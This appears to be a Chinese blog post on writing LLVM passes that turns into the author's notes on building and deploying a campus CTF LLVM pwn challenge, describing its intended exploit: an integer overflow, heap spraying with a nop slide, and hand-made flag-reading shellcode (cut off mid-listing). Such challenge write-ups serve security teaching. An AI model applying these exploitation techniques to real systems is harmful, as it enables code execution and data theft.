href="https://llvm.org/docs/WritingAnLLVMPass.html#setting-up-the-build-environment">Writing an LLVM Pass</a></p><p>在llvm&#x2F;lib&#x2F;Transforms目录下创建文件夹MyPass</p><p>在MyPass文件夹中创建CMakeLists.txt和MyPass.cpp</p><p>llvm&#x2F;lib&#x2F;Transforms&#x2F;MyPass&#x2F;CMakeLists.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">add_llvm_library( LLVMMyPass MODULE BUILDTREE_ONLY<br>  MyPass.cpp<br><br>  DEPENDS<br>  intrinsics_gen<br>  PLUGIN_TOOL<br>  opt<br>  )<br></code></pre></td></tr></table></figure><p>llvm&#x2F;lib&#x2F;Transforms&#x2F;MyPass&#x2F;MyPass.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><br><span class="hljs-comment">// only needed for printing</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;MyPass&gt; &#123;<br><br>  <span class="hljs-comment">// The first argument of the run() function defines on what level</span><br>  <span class="hljs-comment">// of granularity your pass will run (e.g. Module, Function).</span><br>  <span class="hljs-comment">// The second argument is the corresponding AnalysisManager</span><br>  <span class="hljs-comment">// (e.g ModuleAnalysisManager, FunctionAnalysisManager)</span><br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;MyPass in function: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>() &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// Here goes what you want to do with a pass</span><br><br>    <span class="hljs-comment">// Assuming you did not change anything of the IR code</span><br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><br><span class="hljs-comment">// This part is the new way of registering your pass</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK </span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;MyPass&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;my-pass&quot;</span>)&#123;  <span class="hljs-comment">//my-pass是使用opt工具加载时的名称</span><br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">MyPass</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>在llvm&#x2F;lib&#x2F;Transforms&#x2F;CMakeLists.txt中添加</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add_subdirectory</span><span class="hljs-params">(MyPass)</span></span><br></code></pre></td></tr></table></figure><p>最后来到llvm构建时创建的build目录中进行构建，只会构建新增的部分，所以构建很快</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./build.sh<br></code></pre></td></tr></table></figure><p>生成的.so文件在LLVM&#x2F;llvm-project&#x2F;build&#x2F;lib目录中</p><p>现在就可以通过opt工具来使用pass了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">opt -disable-output \<br>-load-pass-plugin=&#x27;/home/op1n/LLVM/llvm-project/build/lib/LLVMMyPass.so&#x27; \<br>-passes=&quot;my-pass&quot; \<br>&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;<br></code></pre></td></tr></table></figure><h3 id="使用clang源码外构建"><a href="#使用clang源码外构建" class="headerlink" title="使用clang源码外构建"></a>使用clang源码外构建</h3><p>在源码外直接使用clang进行构建最方便</p><p>Pass源码，可以在任意目录，只要有源文件即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><br><span class="hljs-comment">// only needed for printing</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;MyPass&gt; &#123;<br><br>  <span class="hljs-comment">// The first argument of the run() function defines on what level</span><br>  <span class="hljs-comment">// of granularity your pass will run (e.g. Module, Function).</span><br>  <span class="hljs-comment">// The second argument is the corresponding AnalysisManager</span><br>  <span class="hljs-comment">// (e.g ModuleAnalysisManager, FunctionAnalysisManager)</span><br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;kkk in function: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>() &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// Here goes what you want to do with a pass</span><br><br>    <span class="hljs-comment">// Assuming you did not change anything of the IR code</span><br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><br><span class="hljs-comment">// This part is the new way of registering your pass</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK</span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;MyPass&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;kkk&quot;</span>)&#123;<br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">MyPass</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用如下命令构建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared MyPass.cpp -o LLVMMyPass.so `llvm-config --ldflags`<br></code></pre></td></tr></table></figure><p>运行Pass，和生成.so的源码集成编译一样，需要so文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">opt -disable-output \<br>-load-pass-plugin=&#x27;./LLVMMyPass.so&#x27; \<br>-passes=&quot;my-pass&quot; \<br>&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kkk <span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span>: foo<br><span class="hljs-title function_">kkk</span> <span class="hljs-title function_">in</span> <span class="hljs-title function_">function</span>: bar<br></code></pre></td></tr></table></figure><h3 id="pass编写"><a href="#pass编写" class="headerlink" title="pass编写"></a>pass编写</h3><p><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_3">这篇文章</a>有一些常用LLVM语法，更多更详细的内容在官方手册。</p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>测试clang生成的.ll文件时，需要删去 ‘attributes #0’ 行的’optnone’一词。</p><p>或在参数中添加-disable-O0-optnone</p><p>例：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">clang -Xclang -disable-O<span class="hljs-number">0</span>-<span class="hljs-keyword">optnone</span> -S -emit-llvm test.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p>否则pass不会生效</p><h2 id="校赛LLVM-PWN出题记录"><a href="#校赛LLVM-PWN出题记录" class="headerlink" title="校赛LLVM PWN出题记录"></a>校赛LLVM PWN出题记录</h2><h3 id="1-题目部署"><a href="#1-题目部署" class="headerlink" title="1.题目部署"></a>1.题目部署</h3><p>租的是ubuntu2004阿里云服务器</p><p>主要使用xinetd部署,可以看<a href="https://blog.csdn.net/Myon5/article/details/131763593">这篇文章</a></p><p>当然实际部署的时候需要做很多修改,以下是成功部署的文件和部署过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ctf_xinetd<span class="hljs-comment"># ls</span><br>bin  ctf.xinetd  Dockerfile  README.md  start.sh<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">/ctf_xinetd/bin# <span class="hljs-keyword">ls</span><br><span class="hljs-built_in">exp</span>  flag  lib  optimizer.<span class="hljs-keyword">so</span>  <span class="hljs-keyword">opt</span>  run.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>lib文件夹是opt运行pass需要的动态链接库，exp是base64解码后的base64输入</p><p>基本思路是用户输入的数据经过base64解码后存在exp(ir代码)，然后运行opt使用题目的pass来优化ir，这些操作都在run.sh完成</p><p>ctf.xinetd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">service ctf<br>&#123; <br>    disable = no<br>    socket_type = stream<br>    protocol    = tcp<br>    wait        = no<br>    user        = root<br>    type        = UNLISTED<br>    port        = 8888<br>    bind        = 0.0.0.0<br>    server      = /usr/sbin/chroot<br>    # replace helloworld to your program<br>    server_args = --userspec=1000:1000 /home/ctf ./run.sh<br>    banner_fail = /etc/banner_fail<br>    # safety options<br>    per_source  = 10 # the maximum instances of this service per source IP address<br>    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use<br>    #rlimit_as  = 1024M # the Address Space resource limit for the service<br>    #access_times = 2:00-9:00 12:00-24:00<br>&#125;<br></code></pre></td></tr></table></figure><p>Dockerfile</p><p>主要是在镜像中的bin目录下添加了base64命令和echo命令，同时给了run.sh和ctf用户rwx权限</p><p>1.base64命令用户解决.ll文件的传输问题。.ll文件有多行，server不方便读取。base64加密后的数据只有一行，shell脚本中一句read就能读取，读取后再base64解码即可。</p><p>2.这里不知道为什么，ctf并不在&#x2F;home&#x2F;ctf的所属组中，改了chown命令也没用，而且要在ctf用户下创建exp文件需要写权限，只能选择了chmod -R 777 &#x2F;home&#x2F;ctf，给了其他用户rwx权限。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 xinetd </span><br><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m ctf </span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cp</span> -R /usr/lib* /home/ctf </span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 666 /home/ctf/dev/*</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/cat /home/ctf/bin &amp;&amp;\</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /usr/bin/base64 /home/ctf/bin &amp;&amp;\</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/echo /home/ctf/bin </span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./bin/ /home/ctf/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="language-bash">     <span class="hljs-built_in">chmod</span> -R 777 /home/ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 744 /home/ctf/flag &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 777 /home/ctf/run.sh    </span><br><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>run.sh</p><p>由于docker接收输入时最多一次性接收4096个字节，而exp长度大约为10000字节，所以循环读入，当用户输入ok时停止输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>  <br>echo &quot;input your base64 encoded ir(.ll) :&quot;<br><br>input=&quot;&quot;<br>while true; do<br>    read -r -n 4096 segment<br>    if [ &quot;$segment&quot; == &quot;ok&quot; ]; then<br>        break<br>    else<br>        input+=&quot;$segment&quot;<br>    fi<br>done<br><br>echo &quot;$input&quot; | base64 -d &gt; exp<br>cat ./exp<br>./opt -disable-output \<br>    -load-pass-plugin=&#x27;./optimizer.so&#x27; \<br>    -passes=&quot;optimizer&quot; \<br>    &#x27;./exp&#x27;<br><br></code></pre></td></tr></table></figure><h4 id="docker建立镜像及测试"><a href="#docker建立镜像及测试" class="headerlink" title="docker建立镜像及测试"></a>docker建立镜像及测试</h4><p>使用Dockerfile创建镜像</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">docker build -t <span class="hljs-string">&quot;test&quot;</span> .<br></code></pre></td></tr></table></figure><p>启动镜像,这里8888对应ctf.xinetd和Dockerfile中expose的端口，nc时本地和远程都使用8090端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -p &quot;0.0.0.0:8090:9999&quot;  -h &quot;test&quot; --name=&quot;test&quot; test<br></code></pre></td></tr></table></figure><p>查看所有镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker ps -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">8090</span><br></code></pre></td></tr></table></figure><p>把.ll文件打包成一行base64</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">base64 test.<span class="hljs-keyword">ll</span> | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; <span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><p>进入容器排查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it 容器<span class="hljs-built_in">id</span> /bin/bash<br></code></pre></td></tr></table></figure><p>停止&#x2F;再次启动&#x2F;删除镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker stop 容器<span class="hljs-built_in">id</span><br>docker start 容器<span class="hljs-built_in">id</span><br>docker <span class="hljs-built_in">rm</span> 容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="2-考点"><a href="#2-考点" class="headerlink" title="2.考点"></a>2.考点</h3><h4 id="对llvm框架基本的认识"><a href="#对llvm框架基本的认识" class="headerlink" title="对llvm框架基本的认识"></a>对llvm框架基本的认识</h4><p>需要分析的是pass编译出来的so文件，opt在运行过程中会加载so</p><p>新版passmanager怎么找分析时的入口函数？在旧版passmanager中找runonfunction函数就可以了，新版中大概是这个样子，本题可以直接查找字符串交叉引用</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">llvm::PreservedAnalyses *__fastcall `anonymous <span class="hljs-keyword">namespace</span><span class="hljs-number">&#x27;</span>::easyheap::run<br></code></pre></td></tr></table></figure><h4 id="本地动态调试"><a href="#本地动态调试" class="headerlink" title="本地动态调试"></a>本地动态调试</h4><p>本地动态调试需要先启动gdb再set args，同时漏洞点是在so库中的，需要一步一步调到目标so中的目标函数。</p><p>首先</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">gdb</span> <span class="hljs-meta">opt</span><br></code></pre></td></tr></table></figure><p>进入gdb后</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> args -disable-output <span class="hljs-attribute">-load-pass-plugin</span>=<span class="hljs-string">&#x27;./optimizer.so&#x27;</span> <span class="hljs-attribute">-passes</span>=<span class="hljs-string">&quot;optimizer&quot;</span> <span class="hljs-string">&#x27;./test.ll&#x27;</span><br></code></pre></td></tr></table></figure><p>在main函数下断点</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><p>用ida查看opt的main函数，跳过前面一大堆init函数，从lea开始调试，经过一次call就vmmap查看有没有pass的so库</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918001151.png" alt="QQ截图20230918001151"></p><p>最终发现在</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">llvm::cl::ParseCommandLineOptions<br></code></pre></td></tr></table></figure><p>函数中导入了pass的so库，从函数名也可以判断该函数是用来解析命令行参数的</p><p>那么，只要在该函数下断点即可</p><p>然后调到pass的入口函数</p><p>通过vmmap可以看到pass的so文件的基址</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003125.png" alt="QQ截图20230918003125"></p><p>如图，这里基址是0x7ffff7fae000，用ida打开so文件，可以找到入口函数相对基址的偏移</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003254.png" alt="QQ截图20230918003254"></p><p>如图，偏移是EC70</p><p>相加后得到入口函数地址为0x7FFFF7FBCC70，直接在该地址下断点即可</p><p>调到入口函数后就和正常pwn题一样啦</p><p>tips:图中演示的文件不是最终的题目文件，偏移可能不一样</p><h4 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h4><p>buy函数存在整型溢出。在buy时可以buy负数的chunk，money会减去这个负数，导致无限money。</p><h4 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h4><p>在无限money的基础上，可以申请任意大小的chunk并编辑其中内容。</p><p>locate可以跳转到一个相对chunk基址有一定随机偏移的地址执行，通过调整buy的chunk的大小并调试可以使loacte随机执行的范围与chunk的范围有交叉，那么此时就有概率从chunk开始执行。</p><p>采用堆喷的思想，在要执行的shellcode前添加滑块如nop，填满chunk，那么随机执行到chunk中时，就可以滑到shellcode执行，否则就要正好随机执行到shellcode首字节，这是万分之一级别的概率。</p><p>给了buy的chunk地址，可以减少调试难度，同时也可以发现malloc的参数为负数时，本地或许可以申请到chunk，但是remote时会申请失败,需要在chunk构造上做调整。</p><p>另外，在locate中开启了沙箱，禁用了execve和execveat，所以要orw，这又涉及另一个问题 — 解析字符串时会被\x00截断，所以要手搓orw_shellcode。</p><p>优化后的shellcode如下，35字节，需要手动把可见字符改成\x的形式否则会把&#x2F;x12和3解析成0x123</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edx,0x67616c66  </span><br><span class="hljs-string">push rdx </span><br><span class="hljs-string">mov rdi,rsp</span><br><span class="hljs-string">xor esi,esi </span><br><span class="hljs-string">xor rax,rax</span><br><span 